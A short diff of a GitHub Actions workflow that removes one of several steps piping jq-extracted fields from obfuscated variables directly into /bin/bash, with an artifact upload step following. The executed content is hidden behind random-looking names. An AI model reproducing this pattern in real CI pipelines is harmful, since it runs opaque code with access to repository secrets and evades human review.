@@ -24,7 +24,6 @@ jobs:
           echo $jison4 | jq -r .q30644 | /bin/bash
           printf '%s' "$zeowz09" | jq -r .kgwjx18045 | /bin/bash
           echo $fbtg665 | jq -r .illr18083 | /bin/bash
-          echo $z104 | jq -r .faxbv897 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
